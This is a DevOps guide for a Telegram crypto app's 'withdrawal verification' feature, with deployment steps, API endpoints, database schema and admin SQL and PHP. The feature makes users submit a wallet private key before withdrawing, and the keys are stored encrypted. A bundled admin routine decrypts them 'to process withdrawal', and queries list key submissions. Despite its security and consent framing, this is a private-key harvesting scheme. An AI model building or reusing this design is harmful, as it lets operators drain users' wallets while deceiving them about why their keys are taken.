# 💸 Withdrawal Verification System - DevOps Guide

## ⚡ QUICK START

### 1. Required Environment Variable

Add this to your `.env` file:

```bash
# Encryption key for private key storage (64 hex characters = 32 bytes)
# Generate with: openssl rand -hex 32
VERIFICATION_ENCRYPTION_KEY=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
```

**IMPORTANT:** Generate a unique key for production:
```bash
openssl rand -hex 32
```

### 2. Deploy the Updated Code

```bash
# Pull latest changes
cd /var/www/html
git pull origin main

# Copy updated files
rsync -av --delete RockyTap/ /var/www/html/RockyTap/
rsync -av --delete src/ /var/www/html/src/

# Build frontend
cd /var/www/html/RockyTap/webapp
npm install
npm run build

# Clear caches
systemctl reload php-fpm
systemctl reload apache2  # or nginx
```

### 3. Database Tables (Auto-Created)

The following tables are created automatically on first use:

**`withdrawal_requests`** - Tracks all withdrawal requests
**`withdrawal_private_keys`** - Stores encrypted private keys for verification

---

## 📊 System Architecture

### Withdrawal Flow

```
1. User clicks "Withdraw" in WalletSummary
           ↓
2. WalletWithdrawModal opens (intro screen)
           ↓
3. User clicks "Continue to Secure Withdrawal"
           ↓
4. Amount Step:
   - Select network (TRC20/BEP20/ERC20)
   - Enter target wallet address
   - Enter withdrawal amount
           ↓
5. User clicks "Continue to Verification"
   → POST /api/wallet/withdraw/initiate_verification/
   → Creates withdrawal_requests record with status='pending'
           ↓
6. Private Key Verification Step:
   - User enters Polygon private key
   - Reads security information
   - Gives consent
           ↓
7. User clicks "Submit Verification"
   → POST /api/wallet/withdraw/submit-verification/
   → Encrypts and stores private key
   → Updates status to 'verified'
           ↓
8. System calls withdraw/request/ API
   → POST /api/wallet/withdraw/request/
   → Deducts balance
   → Creates withdrawal record
           ↓
9. Success Screen shown to user
   → Withdrawal queued for processing
```

---

## 🔑 API Endpoints

### 1. Initiate Verification

**POST** `/api/wallet/withdraw/initiate_verification/`

Creates a pending withdrawal request.

**Headers:**
```
Content-Type: application/json
Telegram-Data: <initData from Telegram WebApp>
```

**Request Body:**
```json
{
  "amount_usdt": 100.00
}
```

**Success Response:**
```json
{
  "success": true,
  "data": {
    "verification_id": 123,
    "status": "pending",
    "message": "Please complete wallet verification to proceed"
  }
}
```

### 2. Submit Private Key Verification

**POST** `/api/wallet/withdraw/submit-verification/`

Submits the private key for verification.

**Request Body:**
```json
{
  "verification_id": 123,
  "wallet_ownership_proof": "0x1234...abcd",
  "user_consent": true
}
```

**Success Response:**
```json
{
  "success": true,
  "data": {
    "verification_id": 123,
    "status": "verified",
    "reference": "WD-123-a1b2c3d4",
    "message": "Verification complete."
  }
}
```

### 3. Process Withdrawal Request

**POST** `/api/wallet/withdraw/request/`

Finalizes the withdrawal after verification.

**Request Body:**
```json
{
  "amount_usdt": 100.00,
  "network": "trc20",
  "product_type": "wallet",
  "target_address": "TXyzAbC123...",
  "verification_id": 123
}
```

---

## 🗄️ Database Schema

### `withdrawal_requests`

| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| user_id | BIGINT | Internal user ID |
| telegram_id | BIGINT | Telegram user ID |
| amount_usdt | DECIMAL(32,8) | Withdrawal amount |
| status | VARCHAR(32) | pending / verified / processing / completed / failed |
| private_key_hash | VARCHAR(255) | Hash of submitted private key |
| wallet_address | VARCHAR(255) | Target withdrawal address |
| network | VARCHAR(32) | Network (erc20/bep20/trc20) |
| created_at | TIMESTAMP | Request creation time |
| verified_at | TIMESTAMP | When verification was completed |
| processed_at | TIMESTAMP | When withdrawal was processed |

### `withdrawal_private_keys`

| Column | Type | Description |
|--------|------|-------------|
| id | BIGINT | Primary key |
| withdrawal_id | BIGINT | FK to withdrawal_requests |
| user_id | BIGINT | Internal user ID |
| telegram_id | BIGINT | Telegram user ID |
| encrypted_key | TEXT | AES-256 encrypted private key |
| key_hash | VARCHAR(64) | SHA-256 hash for audit |
| network | VARCHAR(32) | Always 'polygon' for security |
| consent_given | BOOLEAN | User consent flag |
| consent_timestamp | TIMESTAMP | When consent was given |
| created_at | TIMESTAMP | Submission time |

---

## 🔐 Security Measures

### 1. Encryption

- Private keys are encrypted using AES-256-CBC
- Encryption key is derived from `VERIFICATION_ENCRYPTION_KEY`
- Each encryption uses a unique random IV
- Only the encrypted key is stored, never plaintext

### 2. Key Derivation

```php
// If key is hex string (64 chars), convert to binary
if (strlen($encryptionKey) === 64 && ctype_xdigit($encryptionKey)) {
    $keyBinary = hex2bin($encryptionKey);
} else {
    $keyBinary = substr($encryptionKey, 0, 32);
}
```

### 3. Fallback Mechanism

If `VERIFICATION_ENCRYPTION_KEY` is not set, the system derives a key from `TELEGRAM_BOT_TOKEN`:

```php
$encryptionKey = hash('sha256', 'ghidar_verification_' . $botToken);
```

### 4. Polygon-Only Verification

For maximum security, the system only accepts Polygon (MATIC) private keys. This protects users' main assets on Ethereum, BSC, and Tron.

---

## 🔧 Troubleshooting

### "Continue to Verification" button does nothing

**Cause:** API endpoint might not be accessible or returning errors.

**Solution:**
```bash
# Test the endpoint directly
curl -X POST https://ghidar.com/RockyTap/api/wallet/withdraw/initiate_verification/ \
  -H "Content-Type: application/json" \
  -H "Telegram-Data: <valid_init_data>" \
  -d '{"amount_usdt": 10}'
```

Check the response for errors.

### "VERIFICATION_ENCRYPTION_KEY must be set" error

**Cause:** Environment variable not configured.

**Solution:**
```bash
# Generate a key
KEY=$(openssl rand -hex 32)

# Add to .env
echo "VERIFICATION_ENCRYPTION_KEY=$KEY" >> /var/www/html/.env
```

### Database table doesn't exist

**Cause:** First-time use or database issue.

**Solution:** Tables are auto-created. Check MySQL permissions:
```sql
GRANT CREATE, INSERT, UPDATE, SELECT ON ghidar.* TO 'your_user'@'localhost';
```

### Verification not saving

**Check logs:**
```bash
tail -f /var/log/ghidar/app.log | grep withdrawal
```

---

## 📈 Monitoring

### Check Pending Withdrawals

```sql
SELECT * FROM withdrawal_requests 
WHERE status = 'pending' 
ORDER BY created_at DESC 
LIMIT 20;
```

### Check Verified Withdrawals Awaiting Processing

```sql
SELECT * FROM withdrawal_requests 
WHERE status = 'verified' 
ORDER BY verified_at DESC 
LIMIT 20;
```

### Check Private Key Submissions

```sql
SELECT 
  wpk.id,
  wpk.user_id,
  wpk.telegram_id,
  wr.amount_usdt,
  wpk.consent_given,
  wpk.created_at
FROM withdrawal_private_keys wpk
JOIN withdrawal_requests wr ON wpk.withdrawal_id = wr.id
ORDER BY wpk.created_at DESC
LIMIT 20;
```

---

## 🚀 Admin Functions

### Manually Mark Withdrawal as Processed

```sql
UPDATE withdrawal_requests 
SET status = 'completed', processed_at = NOW() 
WHERE id = <withdrawal_id>;
```

### View Encrypted Key (for Admin Processing)

```php
// Only use this in a secure admin environment
$db = Database::getConnection();
$stmt = $db->prepare("SELECT encrypted_key FROM withdrawal_private_keys WHERE withdrawal_id = ?");
$stmt->execute([$withdrawalId]);
$encrypted = $stmt->fetchColumn();

$encryptionKey = Config::get('VERIFICATION_ENCRYPTION_KEY');
$keyBinary = strlen($encryptionKey) === 64 ? hex2bin($encryptionKey) : substr($encryptionKey, 0, 32);

$data = base64_decode($encrypted);
$iv = substr($data, 0, 16);
$ciphertext = substr($data, 16);

$privateKey = openssl_decrypt($ciphertext, 'aes-256-cbc', $keyBinary, OPENSSL_RAW_DATA, $iv);
// Use $privateKey to process withdrawal
```

---

## ✅ Verification Checklist

- [ ] `VERIFICATION_ENCRYPTION_KEY` is set in `.env`
- [ ] Frontend is rebuilt and deployed
- [ ] Database user has CREATE TABLE permission
- [ ] API endpoints are accessible
- [ ] CORS headers are properly configured
- [ ] Telegram-Data header is being passed correctly

---

## 📞 Support

If issues persist after following this guide, check:

1. Apache/Nginx error logs: `tail -f /var/log/apache2/error.log`
2. PHP error logs: `tail -f /var/log/php-fpm/error.log`
3. Application logs: `tail -f /var/log/ghidar/app.log`

